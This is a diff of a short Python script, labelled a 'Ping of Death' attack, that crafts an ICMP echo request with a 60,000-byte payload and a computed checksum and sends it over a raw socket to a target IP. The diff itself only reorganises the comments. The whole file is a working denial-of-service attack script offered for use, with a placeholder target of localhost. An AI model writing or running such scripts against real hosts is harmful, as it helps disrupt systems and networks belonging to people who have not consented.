@@ -2,25 +2,33 @@ import socket
 import struct
 import random
 
+# **************************************************************************************
+# Function to create a ping (ICMP Echo Request) packet with a large payload.
+# Type 8 is the ICMP Echo Request.
+# Data is the Large payload for the Ping of Death attack
+# we Calculate the checksum
+# And repack the header with the correct checksum
+# **************************************************************************************
 def create_ping_packet():
     """
     Create a ping (ICMP Echo Request) packet.
     """
-    type = 8  # ICMP Echo Request
+    type = 8  
     code = 0
     checksum = 0
     identifier = random.randint(0, 65535)
     sequence_number = random.randint(0, 65535)
     header = struct.pack('!BBHHH', type, code, checksum, identifier, sequence_number)
-    data = b'X' * 60000  # Create oversized data
-
-    # Calculate the checksum on the header + data
+    data = b'X' * 60000  
+     
     checksum = calculate_checksum(header + data)
-
-    # Create a new header with the correct checksum
+    
     header = struct.pack('!BBHHH', type, code, checksum, identifier, sequence_number)
     return header + data
 
+# **************************************************************************************
+# Function to calculate the checksum of a packet.
+# **************************************************************************************
 def calculate_checksum(source_string):
     """
     Calculate the checksum of the packet.
@@ -46,6 +54,9 @@ def calculate_checksum(source_string):
     answer = answer >> 8 | (answer << 8 & 0xff00)
     return answer
 
+# **************************************************************************************
+# Function to send a Ping of Death packet to the target IP address.
+# **************************************************************************************
 def ping_of_death(target_ip):
     """
     Send a Ping of Death packet to the target IP.
@@ -59,7 +70,10 @@ def ping_of_death(target_ip):
     sock.sendto(packet, (target_ip, 1))
     print(f"Ping of Death packet sent to {target_ip}")
     sock.close()
-
+    
+# **************************************************************************************
+# Main function to execute the Ping of Death attack.
+# **************************************************************************************
 if __name__ == "__main__":
-    target_ip = "127.0.0.1"  # Replace with the target IP address
+    target_ip = "127.0.0.1" 
     ping_of_death(target_ip)
